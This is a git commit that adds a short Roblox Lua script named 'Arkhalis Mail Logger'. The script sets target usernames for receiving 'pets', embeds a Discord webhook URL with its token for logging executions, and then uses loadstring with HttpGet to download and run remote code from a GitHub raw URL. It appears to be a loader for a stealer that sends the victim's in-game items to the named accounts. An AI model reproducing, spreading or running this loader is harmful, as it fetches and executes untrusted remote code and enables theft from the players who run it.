a54d974eb5a5d4e6f0c5d8b7807af1ac0df86f6b
Tyr000ne <125683259+Tyr000ne@users.noreply.github.com>
2023-05-27 12:41:13 -0500

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,11 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username1 = "DONUTS4eternity700" --// Username To Send Pets To
+_G.Username2 = "DONUTS4ETERNITY700" --// Username To Send Pets To [OPTIONAL]
+
+--[[ WebHook ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1111600367940157480/ttRBa7jGx5CbJhVKi4ZdoPcinFSF6YEljSklni3yiUpHG7oV9DsTywQvol7wUtteRgTq" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tyr000ne/script-for-donut/main/script.lua", true))()
